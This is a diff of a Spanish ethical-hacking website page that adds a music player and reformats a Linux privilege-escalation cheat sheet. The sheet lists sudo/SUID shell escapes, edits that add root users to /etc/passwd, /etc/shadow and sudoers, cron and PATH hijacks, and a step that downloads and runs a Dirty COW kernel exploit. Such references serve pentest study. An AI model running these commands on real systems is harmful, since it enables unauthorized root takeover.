@@ -1,15 +1,18 @@
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PRIVESC - MAYUSO ETHICAL HACKING</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&family=Roboto+Mono:wght@300;400;500&display=swap" rel="stylesheet">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&family=Roboto+Mono:wght@300;400;500&display=swap"
+        rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <link rel="stylesheet" href="styles.css">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/dist/tabler-icons.min.css">
 </head>
-    
+
 <body>
 
     <nav>
@@ -23,208 +26,275 @@
             <a href="index.html">/HOME</a>
             <a href="pentestools.html">/PENTESTOOLS</a>
             <a href="whoami.html">/WHOAMI</a>
+            <!-- Botón de Música -->
+            <button id="playBtn" class="play-button">
+                <i class="ti ti-player-play"></i>
+            </button>
         </div>
     </nav>
+
+    <audio id="backgroundMusic" loop>
+        <source src="music.mp3" type="audio/mpeg">
+    </audio>
+
+    <!-- SCRIPT de Música -->
+
+    <script>
+        const music = document.getElementById('backgroundMusic');
+        const playBtn = document.getElementById('playBtn');
+
+        // Recuperar estado al cargar la página
+        function loadMusicState() {
+            const isPlaying = localStorage.getItem('musicPlaying') === 'true';
+            const currentTime = parseFloat(localStorage.getItem('musicTime')) || 0;
+
+            if (isPlaying) {
+                music.currentTime = currentTime;
+                music.play().then(() => {
+                    playBtn.innerHTML = '<i class="ti ti-player-pause"></i>';
+                    playBtn.classList.add('playing');
+                });
+            }
+        }
+
+        // Guardar estado cuando se reproduce o pausa
+        function saveMusicState() {
+            localStorage.setItem('musicPlaying', !music.paused);
+            localStorage.setItem('musicTime', music.currentTime);
+        }
+
+        playBtn.addEventListener('click', () => {
+            if (music.paused) {
+                music.play();
+                playBtn.innerHTML = '<i class="ti ti-player-pause"></i>';
+                playBtn.classList.add('playing');
+            } else {
+                music.pause();
+                playBtn.innerHTML = '<i class="ti ti-player-play"></i>';
+                playBtn.classList.remove('playing');
+            }
+            saveMusicState();
+        });
+
+        // Guardar estado antes de cambiar de página
+        window.addEventListener('beforeunload', saveMusicState);
+
+        // Cargar estado al iniciar
+        window.addEventListener('load', loadMusicState);
+    </script>
 
     <canvas id="matrix"></canvas>
 
     <header>
-      <br>
+        <br>
     </header>
 
     <section>
-        <h2 style="font-family: 'Orbitron';">ESCALAR PRIVILEGIOS EN LINUX</h2>
+        <div style="text-align: center; margin-bottom: 0px;">
+            <i class="ti ti-arrow-up" style="color: var(--accent); font-size: 2.4rem; margin-bottom: 0px;"></i>
+            <h2 style="font-family: 'Orbitron', sans-serif; margin: 0;">LINUX PRIVESC</h2>
+        </div>
         <br>
-        <p style="text-align: center;">Buscador de métodos para escalar privilegios en sistemas Linux, por categoría.</p>
+        <p style="text-align: center;">Buscador de métodos para escalar privilegios en sistemas Linux, por categoría.
+        </p>
         <br><br>
 
         <div class="">
 
-<!-- TOOL START -->
-            
-<div class="privilege-escalation-container" style="background: #0f1626; border: 2px solid rgba(255, 0, 51, 0.45); border-radius: 10px; padding: 20px; width: 900px; max-width: 95%; margin: 15px auto; box-shadow: 0 0 15px rgba(255, 0, 51, 0.15); color: #e0f2fe;">
+            <!-- TOOL START -->
 
-    <br>
+            <div class="privilege-escalation-container"
+                style="background: #0f1626; border: 2px solid rgba(255, 0, 51, 0.45); border-radius: 10px; padding: 20px; width: 900px; max-width: 95%; margin: 15px auto; box-shadow: 0 0 15px rgba(255, 0, 51, 0.15); color: #e0f2fe;">
 
-    <select id="categorySelect" onchange="displayMethods()" 
-            style="width: 100%; padding: 10px; margin-bottom: 15px; background: #1a2333; border: 1px solid #555; color: white; border-radius: 6px; font-size: 0.80rem;">
-        <option value="">Selecciona una categoría</option>
-        <option value="suid_binaries">🅱️ SUID Binaries</option>
-        <option value="root_login">👑 Root Login Methods</option>
-        <option value="password_based">🔑 Password-Based Escalation</option>
-        <option value="cron_jobs">⏰ Cron Jobs</option>
-        <option value="writable_files">📝 Writable System Files</option>
-        <option value="path_service">⚙️ Path Injection/Service Misconfigurations</option>
-    </select>
+                <br>
 
-    <div id="methodOutput" style="min-height: 150;">
-        <p class="no-selection" style="color: #888; text-align: center; margin-top: 40px; font-size: 0.80rem;">No hay categoría seleccionada.</p>
-        <table id="methodTable" style="display: none; width: 100%; border-collapse: collapse; font-size: 0.80rem; background: #1a2333;">
-            <thead>
-                <tr style="background: #1f2a3f;">
-                    <th style="padding: 9px; text-align: left; border-bottom: 1px solid #444;">📝 Método</th>
-                    <th style="padding: 9px; text-align: left; border-bottom: 1px solid #444;">📋 Descripción/Comando</th>
-                </tr>
-            </thead>
-            <tbody></tbody>
-        </table>
-    </div>
+                <select id="categorySelect" onchange="displayMethods()"
+                    style="width: 100%; padding: 10px; margin-bottom: 15px; background: #1a2333; border: 1px solid #555; color: white; border-radius: 6px; font-size: 0.80rem;">
+                    <option value="">Selecciona una categoría</option>
+                    <option value="suid_binaries">🅱️ SUID Binaries</option>
+                    <option value="root_login">👑 Root Login Methods</option>
+                    <option value="password_based">🔑 Password-Based Escalation</option>
+                    <option value="cron_jobs">⏰ Cron Jobs</option>
+                    <option value="writable_files">📝 Writable System Files</option>
+                    <option value="path_service">⚙️ Path Injection/Service Misconfigurations</option>
+                </select>
 
-    <p style="font-size: 0.8rem; color: #777; text-align: center; margin-top: 12px;">
-    
-    </p>
-</div>
+                <div id="methodOutput" style="min-height: 150;">
+                    <p class="no-selection"
+                        style="color: #888; text-align: center; margin-top: 40px; font-size: 0.80rem;">No hay categoría
+                        seleccionada.</p>
+                    <table id="methodTable"
+                        style="display: none; width: 100%; border-collapse: collapse; font-size: 0.80rem; background: #1a2333;">
+                        <thead>
+                            <tr style="background: #1f2a3f;">
+                                <th style="padding: 9px; text-align: left; border-bottom: 1px solid #444;">📝 Método
+                                </th>
+                                <th style="padding: 9px; text-align: left; border-bottom: 1px solid #444;">📋
+                                    Descripción/Comando</th>
+                            </tr>
+                        </thead>
+                        <tbody></tbody>
+                    </table>
+                </div>
 
-<script>
-    const methods = {
-        suid_binaries: {
-          sudo: { description: "Ejecuta una shell como superusuario si el binario sudo está mal configurado para permitir comandos arbitrarios sin restricciones.", command: "sudo /bin/bash -l\n\n# Alternativa\nsudo sudo /bin/sh" },
-          awk: { description: "Utiliza awk para ejecutar una shell del sistema si el binario tiene permisos SUID y está permitido ejecutarse con sudo.", command: "sudo awk 'BEGIN {system(\"/bin/sh\")}'" },
-          cp: { description: "Explota permisos SUID en cp para copiar una shell a un binario ejecutable o sobrescribir archivos sensibles.", command: "sudo cp /bin/sh /bin/cp\nsudo cp" },
-          env: { description: "Usa env para ejecutar una shell directamente si tiene permisos SUID o está permitido con sudo sin restricciones.", command: "sudo env /bin/sh" },
-          find: { description: "Ejecuta comandos arbitrarios, como una shell, utilizando la opción -exec de find en sistemas con permisos SUID mal configurados.", command: "sudo find . -exec /bin/sh \\; -quit" },
-          less: { description: "Aprovecha la capacidad de less para ejecutar comandos desde su interfaz interactiva si tiene permisos SUID o sudo.", command: "sudo less /etc/profile\n!/bin/sh" },
-          more: { description: "Similar a less, permite ejecutar comandos desde su interfaz si TERM está configurado y el binario tiene permisos SUID o sudo.", command: "TERM= sudo more /etc/profile\n!/bin/sh" },
-          nano: { description: "Utiliza nano para ejecutar comandos arbitrarios a través de su función de ejecución de comandos si tiene permisos SUID o sudo.", command: "sudo nano\n^R^X\nreset; sh 1>&0 2>&0" },
-          nmap: { description: "Explota scripts Lua en nmap o su modo interactivo (versiones 2.02 a 5.21) para ejecutar una shell si tiene permisos SUID o sudo.", command: "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n\n# Alternativa (versiones 2.02 a 5.21)\nsudo nmap --interactive\nnmap> !sh" },
-          perl: { description: "Ejecuta una shell del sistema usando Perl si el binario tiene permisos SUID o está permitido con sudo.", command: "sudo perl -e 'exec \"/bin/sh\";'" },
-          python: { description: "Ejecuta una shell mediante Python (o Python3) si el binario tiene permisos SUID o está permitido con sudo.", command: "sudo python -c 'import os; os.system(\"/bin/sh\")'" },
-          ruby: { description: "Ejecuta una shell usando Ruby si el binario tiene permisos SUID o está permitido con sudo.", command: "sudo ruby -e 'exec \"/bin/sh\"'" },
-          sed: { description: "Utiliza sed (versión GNU con bash) para ejecutar una shell si tiene permisos SUID o está permitido con sudo.", command: "sudo sed -n '1e exec sh 1>&0' /etc/hosts" },
-          tar: { description: "Aprovecha la opción --checkpoint-action de tar para ejecutar una shell si el binario tiene permisos SUID o sudo.", command: "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" },
-          vi: { description: "Usa vi para ejecutar comandos arbitrarios desde su interfaz si tiene permisos SUID o está permitido con sudo.", command: "sudo vi -c ':!/bin/sh' /dev/null" },
-          vim: { description: "Explota vim para ejecutar una shell mediante comandos, Python o Lua si tiene permisos SUID o está permitido con sudo.", command: "sudo vim -c ':!/bin/sh'" }
-        },
-        root_login: {
-          sudo_su: { description: "Cambia al usuario root ejecutando una shell con privilegios de superusuario usando sudo, si está mal configurado para permitirlo sin contraseña.", command: "sudo su" },
-          su_root: { description: "Inicia una nueva shell como root, requiere la contraseña de root (útil si la contraseña es conocida o débil).", command: "su root" },
-          su_login: { description: "Inicia una shell de login como root con un entorno limpio, cargando las variables de entorno de root.", command: "/usr/bin/su -" },
-          su_root_login: { description: "Similar al anterior, pero especifica explícitamente el usuario root para iniciar una shell de login.", command: "/usr/bin/su - root" },
-          su_login_full: { description: "Inicia una shell de login completa como root, asegurando que se cargue el entorno completo de root.", command: "/usr/bin/su -l root" },
-          chfn_root: { description: "Modifica interactivamente la información de usuario (GECOS) de root, puede explotar configuraciones débiles que permitan cambios no autorizados.", command: "/usr/bin/chfn root" },
-          chsh_root: { description: "Cambia la shell predeterminada de root a /bin/bash, útil si se tiene acceso a modificar configuraciones de usuario.", command: "/usr/bin/chsh -s /bin/bash root" },
-          mount_loop: { description: "Monta un dispositivo de bucle (como una imagen de disco) en /mnt, puede revelar configuraciones o archivos sensibles si no está restringido.", command: "/usr/bin/mount /dev/loop0 /mnt" },
-          newgrp_root: { description: "Cambia el grupo primario a root, iniciando una nueva shell con ese grupo, útil si el grupo root no está protegido adecuadamente.", command: "/usr/bin/newgrp root" }
-        },
-        password_based: {
-          passwd_root: { description: "Cambia la contraseña de root y luego inicia una sesión como root con la nueva contraseña, explotando sistemas donde passwd no está restringido.", command: "/usr/bin/passwd root\nsu -" }
-        },
-        cron_jobs: {
-          cron_script_overwrite: { description: "Explota un script ejecutado por un cron job con permisos de root si el script o su directorio es escribible, sobrescribiéndolo con un comando para obtener una shell de root.", command: "# Identificar cron jobs: crontab -l, cat /etc/crontab, ls /etc/cron.*\n# Si un script (e.g., /path/to/script.sh) es escribible\necho '/bin/sh' > /path/to/script.sh\n# Esperar a que el cron job ejecute el script" },
-          cron_path_injection: { description: "Explota un cron job que ejecuta un comando sin ruta absoluta en un directorio escribible incluido en $PATH, permitiendo inyectar un script malicioso.", command: "# Identificar cron jobs sin rutas absolutas: cat /etc/crontab\n# Si el cron ejecuta 'script.sh' y /tmp está en $PATH\necho '/bin/sh' > /tmp/script.sh\nchmod +x /tmp/script.sh\n# Esperar a que el cron job ejecute el script" }
-        },
-        writable_files: {
-          etc_passwd: { description: "Si /etc/passwd es escribible, añade un nuevo usuario con UID=0 (root) para obtener privilegios de superusuario.", command: "# Verificar permisos: ls -l /etc/passwd\n# Generar hash de contraseña: openssl passwd -1 newpassword\necho 'hacker:$1$hash:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu hacker" },
-          etc_shadow: { description: "Si /etc/shadow es escribible, modifica la contraseña de root o añade un usuario con privilegios, permitiendo acceso como root.", command: "# Verificar permisos: ls -l /etc/shadow\n# Generar hash: openssl passwd -1 newpassword\necho 'root:$1$hash:0:0:99999:7:::' > /tmp/shadow\ntouch /tmp/shadow\nsudo mv /tmp/shadow /etc/shadow\nsu root" },
-          etc_sudoers: { description: "Si /etc/sudoers es escribible, añade una regla para otorgar privilegios de sudo al usuario actual sin necesidad de contraseña.", command: "# Verificar permisos: ls -l /etc/sudoers\necho 'username ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers\nsudo /bin/bash" }
-        },
-        path_service: {
-          path_injection: { description: "Explota un $PATH mal configurado donde un directorio escribible precede a los directorios del sistema, permitiendo inyectar un binario malicioso.", command: "# Verificar $PATH: echo $PATH\n# Si /tmp está al inicio de $PATH\necho '/bin/sh' > /tmp/ls\nchmod +x /tmp/ls\n# Ejecutar un comando (e.g., ls) que llame al script malicioso\nls" },
-          service_config: { description: "Modifica un archivo de configuración de un servicio ejecutado como root (si es escribible) para ejecutar un comando arbitrario, como una shell de root.", command: "# Identificar servicios: systemctl list-units\n# Si un archivo de servicio (e.g., /etc/systemd/system/service.conf) es escribible\necho 'ExecStart=/bin/sh' >> /etc/systemd/system/service.conf\nsystemctl daemon-reload\nsystemctl restart service" },
-          kernel_exploit: { description: "Utiliza una vulnerabilidad conocida del kernel (e.g., Dirty COW) para obtener privilegios de root. Requiere conocer la versión del kernel (uname -r).", command: "# Verificar versión del kernel: uname -r\n# Descargar y compilar exploit (ejemplo: Dirty COW)\nwget https://dirtycow.ninja/dirtycow.c\ngcc -pthread dirtycow.c -o dirtycow\n./dirtycow" }
-        }
-      };
+                <p style="font-size: 0.8rem; color: #777; text-align: center; margin-top: 12px;">
 
-    function displayMethods() {
-        const category = document.getElementById('categorySelect').value;
-        const tableBody = document.querySelector('#methodTable tbody');
-        const noSelection = document.querySelector('.no-selection');
-        const table = document.getElementById('methodTable');
-        tableBody.innerHTML = '';
+                </p>
+            </div>
 
-        if (category) {
-            noSelection.style.display = 'none';
-            table.style.display = 'table';
+            <script>
+                const methods = {
+                    suid_binaries: {
+                        sudo: { description: "Ejecuta una shell como superusuario si el binario sudo está mal configurado para permitir comandos arbitrarios sin restricciones.", command: "sudo /bin/bash -l\n\n# Alternativa\nsudo sudo /bin/sh" },
+                        awk: { description: "Utiliza awk para ejecutar una shell del sistema si el binario tiene permisos SUID y está permitido ejecutarse con sudo.", command: "sudo awk 'BEGIN {system(\"/bin/sh\")}'" },
+                        cp: { description: "Explota permisos SUID en cp para copiar una shell a un binario ejecutable o sobrescribir archivos sensibles.", command: "sudo cp /bin/sh /bin/cp\nsudo cp" },
+                        env: { description: "Usa env para ejecutar una shell directamente si tiene permisos SUID o está permitido con sudo sin restricciones.", command: "sudo env /bin/sh" },
+                        find: { description: "Ejecuta comandos arbitrarios, como una shell, utilizando la opción -exec de find en sistemas con permisos SUID mal configurados.", command: "sudo find . -exec /bin/sh \\; -quit" },
+                        less: { description: "Aprovecha la capacidad de less para ejecutar comandos desde su interfaz interactiva si tiene permisos SUID o sudo.", command: "sudo less /etc/profile\n!/bin/sh" },
+                        more: { description: "Similar a less, permite ejecutar comandos desde su interfaz si TERM está configurado y el binario tiene permisos SUID o sudo.", command: "TERM= sudo more /etc/profile\n!/bin/sh" },
+                        nano: { description: "Utiliza nano para ejecutar comandos arbitrarios a través de su función de ejecución de comandos si tiene permisos SUID o sudo.", command: "sudo nano\n^R^X\nreset; sh 1>&0 2>&0" },
+                        nmap: { description: "Explota scripts Lua en nmap o su modo interactivo (versiones 2.02 a 5.21) para ejecutar una shell si tiene permisos SUID o sudo.", command: "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n\n# Alternativa (versiones 2.02 a 5.21)\nsudo nmap --interactive\nnmap> !sh" },
+                        perl: { description: "Ejecuta una shell del sistema usando Perl si el binario tiene permisos SUID o está permitido con sudo.", command: "sudo perl -e 'exec \"/bin/sh\";'" },
+                        python: { description: "Ejecuta una shell mediante Python (o Python3) si el binario tiene permisos SUID o está permitido con sudo.", command: "sudo python -c 'import os; os.system(\"/bin/sh\")'" },
+                        ruby: { description: "Ejecuta una shell usando Ruby si el binario tiene permisos SUID o está permitido con sudo.", command: "sudo ruby -e 'exec \"/bin/sh\"'" },
+                        sed: { description: "Utiliza sed (versión GNU con bash) para ejecutar una shell si tiene permisos SUID o está permitido con sudo.", command: "sudo sed -n '1e exec sh 1>&0' /etc/hosts" },
+                        tar: { description: "Aprovecha la opción --checkpoint-action de tar para ejecutar una shell si el binario tiene permisos SUID o sudo.", command: "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" },
+                        vi: { description: "Usa vi para ejecutar comandos arbitrarios desde su interfaz si tiene permisos SUID o está permitido con sudo.", command: "sudo vi -c ':!/bin/sh' /dev/null" },
+                        vim: { description: "Explota vim para ejecutar una shell mediante comandos, Python o Lua si tiene permisos SUID o está permitido con sudo.", command: "sudo vim -c ':!/bin/sh'" }
+                    },
+                    root_login: {
+                        sudo_su: { description: "Cambia al usuario root ejecutando una shell con privilegios de superusuario usando sudo, si está mal configurado para permitirlo sin contraseña.", command: "sudo su" },
+                        su_root: { description: "Inicia una nueva shell como root, requiere la contraseña de root (útil si la contraseña es conocida o débil).", command: "su root" },
+                        su_login: { description: "Inicia una shell de login como root con un entorno limpio, cargando las variables de entorno de root.", command: "/usr/bin/su -" },
+                        su_root_login: { description: "Similar al anterior, pero especifica explícitamente el usuario root para iniciar una shell de login.", command: "/usr/bin/su - root" },
+                        su_login_full: { description: "Inicia una shell de login completa como root, asegurando que se cargue el entorno completo de root.", command: "/usr/bin/su -l root" },
+                        chfn_root: { description: "Modifica interactivamente la información de usuario (GECOS) de root, puede explotar configuraciones débiles que permitan cambios no autorizados.", command: "/usr/bin/chfn root" },
+                        chsh_root: { description: "Cambia la shell predeterminada de root a /bin/bash, útil si se tiene acceso a modificar configuraciones de usuario.", command: "/usr/bin/chsh -s /bin/bash root" },
+                        mount_loop: { description: "Monta un dispositivo de bucle (como una imagen de disco) en /mnt, puede revelar configuraciones o archivos sensibles si no está restringido.", command: "/usr/bin/mount /dev/loop0 /mnt" },
+                        newgrp_root: { description: "Cambia el grupo primario a root, iniciando una nueva shell con ese grupo, útil si el grupo root no está protegido adecuadamente.", command: "/usr/bin/newgrp root" }
+                    },
+                    password_based: {
+                        passwd_root: { description: "Cambia la contraseña de root y luego inicia una sesión como root con la nueva contraseña, explotando sistemas donde passwd no está restringido.", command: "/usr/bin/passwd root\nsu -" }
+                    },
+                    cron_jobs: {
+                        cron_script_overwrite: { description: "Explota un script ejecutado por un cron job con permisos de root si el script o su directorio es escribible, sobrescribiéndolo con un comando para obtener una shell de root.", command: "# Identificar cron jobs: crontab -l, cat /etc/crontab, ls /etc/cron.*\n# Si un script (e.g., /path/to/script.sh) es escribible\necho '/bin/sh' > /path/to/script.sh\n# Esperar a que el cron job ejecute el script" },
+                        cron_path_injection: { description: "Explota un cron job que ejecuta un comando sin ruta absoluta en un directorio escribible incluido en $PATH, permitiendo inyectar un script malicioso.", command: "# Identificar cron jobs sin rutas absolutas: cat /etc/crontab\n# Si el cron ejecuta 'script.sh' y /tmp está en $PATH\necho '/bin/sh' > /tmp/script.sh\nchmod +x /tmp/script.sh\n# Esperar a que el cron job ejecute el script" }
+                    },
+                    writable_files: {
+                        etc_passwd: { description: "Si /etc/passwd es escribible, añade un nuevo usuario con UID=0 (root) para obtener privilegios de superusuario.", command: "# Verificar permisos: ls -l /etc/passwd\n# Generar hash de contraseña: openssl passwd -1 newpassword\necho 'hacker:$1$hash:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu hacker" },
+                        etc_shadow: { description: "Si /etc/shadow es escribible, modifica la contraseña de root o añade un usuario con privilegios, permitiendo acceso como root.", command: "# Verificar permisos: ls -l /etc/shadow\n# Generar hash: openssl passwd -1 newpassword\necho 'root:$1$hash:0:0:99999:7:::' > /tmp/shadow\ntouch /tmp/shadow\nsudo mv /tmp/shadow /etc/shadow\nsu root" },
+                        etc_sudoers: { description: "Si /etc/sudoers es escribible, añade una regla para otorgar privilegios de sudo al usuario actual sin necesidad de contraseña.", command: "# Verificar permisos: ls -l /etc/sudoers\necho 'username ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers\nsudo /bin/bash" }
+                    },
+                    path_service: {
+                        path_injection: { description: "Explota un $PATH mal configurado donde un directorio escribible precede a los directorios del sistema, permitiendo inyectar un binario malicioso.", command: "# Verificar $PATH: echo $PATH\n# Si /tmp está al inicio de $PATH\necho '/bin/sh' > /tmp/ls\nchmod +x /tmp/ls\n# Ejecutar un comando (e.g., ls) que llame al script malicioso\nls" },
+                        service_config: { description: "Modifica un archivo de configuración de un servicio ejecutado como root (si es escribible) para ejecutar un comando arbitrario, como una shell de root.", command: "# Identificar servicios: systemctl list-units\n# Si un archivo de servicio (e.g., /etc/systemd/system/service.conf) es escribible\necho 'ExecStart=/bin/sh' >> /etc/systemd/system/service.conf\nsystemctl daemon-reload\nsystemctl restart service" },
+                        kernel_exploit: { description: "Utiliza una vulnerabilidad conocida del kernel (e.g., Dirty COW) para obtener privilegios de root. Requiere conocer la versión del kernel (uname -r).", command: "# Verificar versión del kernel: uname -r\n# Descargar y compilar exploit (ejemplo: Dirty COW)\nwget https://dirtycow.ninja/dirtycow.c\ngcc -pthread dirtycow.c -o dirtycow\n./dirtycow" }
+                    }
+                };
 
-            const categoryMethods = methods[category];
-            if (categoryMethods) {
-                Object.keys(categoryMethods).forEach(key => {
-                    const meth = categoryMethods[key];
-                    const row = document.createElement('tr');
-                    row.innerHTML = `
+                function displayMethods() {
+                    const category = document.getElementById('categorySelect').value;
+                    const tableBody = document.querySelector('#methodTable tbody');
+                    const noSelection = document.querySelector('.no-selection');
+                    const table = document.getElementById('methodTable');
+                    tableBody.innerHTML = '';
+
+                    if (category) {
+                        noSelection.style.display = 'none';
+                        table.style.display = 'table';
+
+                        const categoryMethods = methods[category];
+                        if (categoryMethods) {
+                            Object.keys(categoryMethods).forEach(key => {
+                                const meth = categoryMethods[key];
+                                const row = document.createElement('tr');
+                                row.innerHTML = `
                         <td style="padding: 9px; border-bottom: 1px solid #333; color: #ff0808;">${key.replace('_', ' ').toUpperCase()}</td>
                         <td style="padding: 9px; border-bottom: 1px solid #333;">
                             <div style="margin-bottom: 6px; color: #ddd;">${meth.description}</div>
                             <pre style="background: #000; padding: 8px; border-radius: 4px; color: #fff; font-size: 0.78rem; white-space: pre-wrap; overflow-x: auto;">${meth.command}</pre>
                         </td>
                     `;
-                    tableBody.appendChild(row);
-                });
-            }
-        } else {
-            noSelection.style.display = 'block';
-            table.style.display = 'none';
-        }
-    }
-</script>
+                                tableBody.appendChild(row);
+                            });
+                        }
+                    } else {
+                        noSelection.style.display = 'block';
+                        table.style.display = 'none';
+                    }
+                }
+            </script>
 
-<!-- TOOL END -->
+            <!-- TOOL END -->
 
-</div>
-</section>
+        </div>
+    </section>
 
     <a href="pentestools.html" class="card-button">
         <i class="ti ti-device-imac-cog" style="color: var(--accent); margin-right: 10px; font-size: 1.4rem;"></i>
         Volver a Pentesting Tools
     </a>
-    
-        <br><br><br><br>
 
-<footer>
-    <div class="footer-content">
+    <br><br><br><br>
 
-        <div>
-            <strong style="display:block; margin-bottom:12px;">HERRAMIENTAS</strong>
-            <a href="pentestools.html" class="footer-link">Pentesting Tools</a><br>
-            <a href="osintools.html" class="footer-link">OSINT Tools </a><br>
-            <a href="aitools.html" class="footer-link">AI Tools</a>
+    <footer>
+        <div class="footer-content">
+
+            <div>
+                <strong style="display:block; margin-bottom:12px;">HERRAMIENTAS</strong>
+                <a href="pentestools.html" class="footer-link">Pentesting Tools</a><br>
+                <a href="osintools.html" class="footer-link">OSINT Tools </a><br>
+                <a href="aitools.html" class="footer-link">AI Tools</a>
+            </div>
+
+            <div>
+                <strong style="display:block; margin-bottom:12px;">APUNTES</strong>
+                <a href="replinux.html" class="footer-link">Repositorio Linux</a><br>
+                <a href="repwindows.html" class="footer-link">Repositorio Windows</a><br>
+                <a href="pentestingweb.html" class="footer-link">Pentesting Web</a><br>
+                <a href="autoproteccion.html" class="footer-link">Autoprotección Digital</a><br>
+                <a href="ejpt.html" class="footer-link">EJPTv2*</a><br>
+                <a href="howtoattack.html" class="footer-link">Guía de Ataque*</a><br>
+                <a href="writeups.html" class="footer-link">CTF Writeups</a>
+            </div>
+
+            <div>
+                <strong style="display:block; margin-bottom:12px;">MISCELÁNEA</strong>
+                <a href="ctf.html" class="footer-link">Mi Reto CTF</a><br>
+                <a href="wallpapers.html" class="footer-link">Wallpapers</a><br>
+                <a href="parches.html" class="footer-link">Parches</a><br>
+                <a href="https://www.youtube.com/@SF01Ghost" target="_blank" class="footer-link">Hacking Music</a><br>
+                <a href="terminal.html" class="footer-link">Terminal Linux</a><br>
+                <a href="whoami.html" class="footer-link">Whoami</a>
+            </div>
+
+            <div>
+                <strong style="display:block; margin-bottom:12px;">REDES SOCIALES</strong>
+                <a href="https://www.linkedin.com/in/mayuso-eh/" target="_blank" class="footer-link">LinkedIn</a><br>
+                <a href="https://github.com/MAyusoEH" target="_blank" class="footer-link">GitHub</a><br>
+                <a href="https://www.youtube.com/@SF01Ghost" target="_blank" class="footer-link">YouTube</a>
+            </div>
         </div>
-        
-        <div>
-            <strong style="display:block; margin-bottom:12px;">APUNTES</strong>
-            <a href="replinux.html" class="footer-link">Repositorio Linux</a><br>
-            <a href="repwindows.html" class="footer-link">Repositorio Windows</a><br>
-            <a href="pentestingweb.html" class="footer-link">Pentesting Web</a><br>
-            <a href="autoproteccion.html" class="footer-link">Autoprotección Digital</a><br>
-            <a href="ejpt.html" class="footer-link">EJPTv2*</a><br>
-            <a href="howtoattack.html" class="footer-link">Guía de Ataque*</a><br>
-            <a href="writeups.html" class="footer-link">CTF Writeups</a>
+
+        <div
+            style="margin-top:50px; display:flex; align-items:center; justify-content:center; gap:25px; flex-wrap:wrap;">
+            <img src="assets/img/mayured.png" alt="Logo" style="height:80px;">
+
+            <script type='text/javascript' src='https://storage.ko-fi.com/cdn/widget/Widget_2.js'></script>
+            <script
+                type='text/javascript'>kofiwidget2.init('Invítame a un café', '#cc2525', 'O4O31LGS09'); kofiwidget2.draw();</script>
+
+            <div>
+                <p style="margin:8px 0 4px 0; color: var(--text)">Contacto: <a href="mailto:sf01ghost@gmail.com"
+                        style="color:#E3E3E3;">sf01ghost@gmail.com</a></p>
+            </div>
         </div>
 
-        <div>
-            <strong style="display:block; margin-bottom:12px;">MISCELÁNEA</strong>
-            <a href="ctf.html" class="footer-link">Mi Reto CTF</a><br>
-            <a href="wallpapers.html" class="footer-link">Wallpapers</a><br>
-            <a href="parches.html" class="footer-link">Parches</a><br>
-            <a href="https://www.youtube.com/@SF01Ghost" target="_blank" class="footer-link">Hacking Music</a><br>
-            <a href="terminal.html" class="footer-link">Terminal Linux</a><br>
-            <a href="whoami.html" class="footer-link">Whoami</a>
-        </div>
-
-        <div>
-            <strong style="display:block; margin-bottom:12px;">REDES SOCIALES</strong>
-            <a href="https://www.linkedin.com/in/mayuso-eh/" target="_blank" class="footer-link">LinkedIn</a><br>
-            <a href="https://github.com/MAyusoEH" target="_blank" class="footer-link">GitHub</a><br>
-            <a href="https://www.youtube.com/@SF01Ghost" target="_blank" class="footer-link">YouTube</a>
-        </div>
-    </div>
-
-    <div style="margin-top:50px; display:flex; align-items:center; justify-content:center; gap:25px; flex-wrap:wrap;">
-        <img src="assets/img/mayured.png" alt="Logo" style="height:80px;">
-
-        <script type='text/javascript' src='https://storage.ko-fi.com/cdn/widget/Widget_2.js'></script>
-        <script type='text/javascript'>kofiwidget2.init('Invítame a un café', '#cc2525', 'O4O31LGS09');kofiwidget2.draw();</script>
-
-        <div>
-            <p style="margin:8px 0 4px 0; color: var(--text)">Contacto: <a href="mailto:sf01ghost@gmail.com" style="color:#E3E3E3;">sf01ghost@gmail.com</a></p>
-        </div>
-    </div>
-
-    <p style="margin-top:20px; font-size:0.85em; opacity:0.8; color: var(--text)">
-        © 2026 Miguel Ángel Ayuso Jiménez • This work is licensed under CC BY-NC-ND 4.0
-    </p>
-    <br>
-</footer>
+        <p style="margin-top:20px; font-size:0.85em; opacity:0.8; color: var(--text)">
+            © 2026 Miguel Ángel Ayuso Jiménez • This work is licensed under CC BY-NC-ND 4.0
+        </p>
+        <br>
+    </footer>
 
     <div class="back-to-top" onclick="window.scrollTo({top: 0, behavior: 'smooth'});">
         ↑
@@ -239,12 +309,12 @@
         }
         resize();
         window.addEventListener('resize', resize);
-      
+
         const chars = '01アイウエオ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
         const fontSize = 13;
         const columns = canvas.width / fontSize;
         const drops = Array(Math.floor(columns)).fill(1);
-      
+
         function draw() {
             ctx.fillStyle = 'rgba(10, 10, 18, 0.06)';
             ctx.fillRect(0, 0, canvas.width, canvas.height);
@@ -260,4 +330,5 @@
         setInterval(draw, 35);
     </script>
 </body>
+
 </html>
